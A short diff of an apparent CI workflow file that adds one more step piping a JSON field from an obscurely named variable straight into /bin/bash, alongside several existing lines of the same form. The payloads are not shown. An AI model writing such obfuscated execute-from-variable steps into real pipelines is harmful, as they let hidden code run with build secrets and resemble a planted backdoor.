@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$utsj14965" | jq -r .hqjoz30 | /bin/bash
           printf '%s' "$ltgnt69238" | jq -r .jbpq469 | /bin/bash
           printf '%s' "$getg218" | jq -r .w22 | /bin/bash
+          echo $r8 | jq -r .iwjk4 | /bin/bash
 
       - name: Upload data
         if: always()
